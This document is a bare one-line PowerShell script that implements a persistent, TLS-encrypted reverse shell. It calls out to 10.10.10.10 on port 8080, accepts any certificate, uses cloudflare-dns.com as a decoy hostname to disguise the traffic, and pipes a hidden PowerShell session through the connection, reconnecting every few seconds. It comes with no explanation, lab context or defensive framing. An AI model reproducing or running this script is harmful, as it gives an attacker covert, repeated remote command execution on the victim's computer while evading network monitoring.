$a='10.10.10.10';$p=8080;$h='cloudflare-dns.com';$r=5;function S($s){$e=New-Object System.Text.UTF8Encoding;$pr=New-Object System.Diagnostics.Process;$pr.StartInfo=@{FileName=(if(Get-Command 'pwsh' -Ex SilentlyContinue){'pwsh'}else{'powershell'});Arguments='-NoL -NoP';RedirectStandardInput=$true;RedirectStandardOutput=$true;RedirectStandardError=$true;UseShellExecute=$false;CreateNoWindow=$true};$pr.Start();$iw=$pr.StandardInput;$or=$pr.StandardOutput;$er=$pr.StandardError;[byte[]]$b=New-Object byte[] 10240;while(!$pr.HasExited -and $s.CanWrite){try{while($or.Peek() -ne -1){$d=$e.GetBytes([char]$or.Read());$s.Write($d,0,$d.Length)}while($er.Peek() -ne -1){$d=$e.GetBytes([char]$er.Read());$s.Write($d,0,$d.Length)}if($s.DataAvailable){$v=$s.Read($b,0,$b.Length);if($v -gt 0){$iw.Write($e.GetString($b,0,$v))}}Start-Sleep -m 50}catch{break}}$pr.Kill()};while($true){try{$c=New-Object System.Net.Sockets.TCPClient;$con=$c.BeginConnect($a,$p,$null,$null);while(!$con.IsCompleted){Start-Sleep -s $r}$c.EndConnect($con);$st=$c.GetStream();$ss=New-Object Net.Security.SslStream($st,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$ss.AuthenticateAsClient($h,$null,[System.Security.Authentication.SslProtocols]::Tls12,$false);if($ss.IsEncrypted){S $ss}}catch{}finally{if($ss){$ss.Close()};if($c){$c.Close()};Start-Sleep -s $r}}
